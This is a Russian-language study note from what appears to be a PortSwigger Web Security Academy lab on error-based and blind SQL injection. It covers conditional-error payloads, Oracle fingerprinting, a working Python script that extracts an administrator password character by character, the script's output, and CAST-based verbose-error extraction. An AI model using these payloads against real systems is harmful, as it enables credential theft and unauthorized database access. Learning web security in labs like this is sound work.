[[0Определение SQL Injection]] - карта раздела
## Оглавление

[[#Определение]]
[[#Эксплуатация]]
[[#Пример в лабе]]
[[#Решение более сложного примера]]
[[#Пример эксплоита для перебора]] 
[[#Извлечение данных с помощью подробных сообщений об ошибках в SQL]]

---
#### Определение
> [!info] Определение поняти Error-Based SQL injection
> Относится к случаям когда можем использовать сообщения об ошибках для извлечения конфиденциальных данных из БД. Возможности зависят от конфигурации бд и типов ошибок которые можно вызвать

> [!example] Пример
> Возможно удастся заставить приложение возвращать ответ на основе логического результата выражения, это можно использовать как ответы при Blind SQL injection
> Может быть получится инициировать сообщения об ошибках которые выводят данные, возвращаемые запросом, что по факту превращает их в SQL инъекции которые в противном случае были бы незаметны

---
#### Эксплуатация

Часто можно заставить приложение возвращать другой ответ в зависимости от того возникает ли ошибка SQL, Мы можем изменить запрос таким образом чтобы он вызывал ошибку только в том случае если условие выполняется. Очень часто необработанная ошибка, вызванная базой данных приводит к некоторой разнице в реакции приложения, например, к появлению сообщения об ошибке это и позволяет делать выводы об истинности условия

Для того чтобы посмотреть как это работает, предположим, что по очереди отправляются два запроса, содержащих следующие значения cookie TrackingID:

> [!payload] 
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a #1 запрос
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a #2 запрос
```
смысл принудительно вызвать ошибку или не вызывать
`CASE` делает ветвление внутри SQL
Формат: `CASE WHEN условие THEN выражение ELSE выражение END`
**В пером запросе** условие `1=2` ложное условие срабатывает ветка `else 'a'` никакой ошибки не будет, сервер будет вести себя как обычно, потому что сравнение `'a'='a'` будет истинно и следовательно приложение отвечает стандартно
**Во втором запросе** `1=1` истина а следовательно выполняется ветка `THEN 1/0` - деление на 0. Это вызывает SQL-ошибку. В результате сервер возвращает иной ответ, например 500 ошибку

---
#### Пример в лабе
> [!payload] 
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password,1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```


---
#### Решение более сложного примера
В этом примере у на приложение уязвимо для инъекции через параметр tracking-Id пробуем его поменять чтобы найти ошибки: 
> [!example] 
```
TrackingId=xyz'
```
500 ошибка, значит наша вставка ломает логику
```
TrackingId=xyz''
```
при использовании двух кавычек ничего не ломается значит наша вставка не повлияла на правильность исполнения запроса
дальше тестим различные варианты
1 
```
TrackingId=xyz'SELECT NULL'
TrackingId=xyz'CONCAT(SELECT NULL)' - ошибки 500 на оба запроса значит маловероятно что это MySQL
```
2
```
TrackingId=xyz'+SELECT+NULL' - 500 маловероятно что Microsoft  
```
3 пробуем что то для Postrge
```
TrackingId=xyz'||(SELECT NULL)||' - тоже ошибка 500 значит не Postgre
```
4 пробуем что то для Oracle 
```
TrackingId=xyz'||(SELECT NULL FROM dual)||' - сработало значит это Oracle
```
потому что `Oracle` требует указание базы данных для каждого `SELECT`
Дальше пробуем прописать само условие и добится его срабатывания и вызова ошибок сервера
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' - вот так у меня получилось добится 200 благодаря шпаргалке
===============================================================
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' - а так появляется 500 потому что условие TRUE и мы вызываем действие 1/0
```
теперь надо составить для таблицы `users` пользователя `administrator` и строчек `user` и `password` при этом чтобы условие работало и не вызывало ошибок
```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' - не вызывает ошибок
```
теперь можно пробовать переходить непосредственно к самому паролю, я попробую прописать через substr таким образом чтобы при правильном символе вызывалась 500 ошибка
```
TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)>'a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 
```
для проверки я ставил знаки больше или меньше потому что одни 100% должен дать ошибку если мой запрос корректен, и действительно в моем случае 500 дал знак `<`, следовательно запрос валиден и пишем программу на питоне

#### Пример эксплоита для перебора

> [!exploit] 
```python
import requests
import string

targ_url = "https://0ac100c504f6a7998011080b00e300f6.web-security-academy.net"
tracking = "QYapmBM3Z2PmUZJ6"
session = "lwyr18qFxj1i4BMJ1nfGUuy0BeIhYwAe"
possible_chars = string.ascii_letters+string.digits
extracted_password = ""

def check_char(position, char):
    payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    injected_cookie = tracking + payload
    cookies = {
        "TrackingId": injected_cookie,
        "session": session
    }

    response = requests.get(targ_url, cookies=cookies)
    return response.status_code == 500

def exploit():
    global extracted_password
    print("[*] Starting blind SQL injection...")

    for i in range(1, 100):  
        for char in possible_chars:
            if check_char(i, char):
                extracted_password += char
                print(f"[+] Found character {i}: {char} -> {extracted_password}")
                break
        else:
            print(f"[-] No match found at position {i}. Ending.")
            break

    print(f"[*] Extraction complete. Password: {extracted_password}")

if __name__ == "__main__":
    exploit()
```
и вот такой результат я получил 
```
[*] Starting blind SQL injection...
[+] Found character 1: 6 -> 6
[+] Found character 2: w -> 6w
[+] Found character 3: t -> 6wt
[+] Found character 4: 1 -> 6wt1
[+] Found character 5: e -> 6wt1e
[+] Found character 6: h -> 6wt1eh
[+] Found character 7: m -> 6wt1ehm
[+] Found character 8: w -> 6wt1ehmw
[+] Found character 9: 7 -> 6wt1ehmw7
[+] Found character 10: v -> 6wt1ehmw7v
[+] Found character 11: o -> 6wt1ehmw7vo
[+] Found character 12: e -> 6wt1ehmw7voe
[+] Found character 13: a -> 6wt1ehmw7voea
[+] Found character 14: 4 -> 6wt1ehmw7voea4
[+] Found character 15: z -> 6wt1ehmw7voea4z
[+] Found character 16: u -> 6wt1ehmw7voea4zu
[+] Found character 17: w -> 6wt1ehmw7voea4zuw
[+] Found character 18: c -> 6wt1ehmw7voea4zuwc
[+] Found character 19: h -> 6wt1ehmw7voea4zuwch
[+] Found character 20: l -> 6wt1ehmw7voea4zuwchl
[*] Extraction complete. Password: 6wt1ehmw7voea4zuwchl
```

#### Извлечение данных с помощью подробных сообщений об ошибках в SQL

Неправильная ошибка конфигурации приводит к появлению подробной информации о SQL ошибках, сами ошибки могут содержать полезную информацию, пример: 
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
Здесь выводится полный запрос с использованием наших входных данных, мы видим что в данном случае мы вводим строчку в одинарных кавычках внутри `Where`
Иногда мы можем заставить приложение сгенерировать сообщение об ошибке содержащее некоторые данные возвращаемые запросом, по факту это превращает которая была бы скрыта при внедрении вслепую 
Для исполнения такой инъекции мы можем использовать функцию `CAST()` которая позволяет преобразовывать один тип данных в другой
Например: 
```
CAST((SELECT example_column FROM example_table) AS int)
```
Часто данные для чтения это строка, попытка преобразовать их в несовместимы тип данных приводит к ошибке: 
```
ERROR: invalid input syntax for type integer: "Example data"
```
Это так же может быть полезно если ограничение по количеству символов не позволяет запускать условные ответы(те которые мы используем когда перебираем вслепую)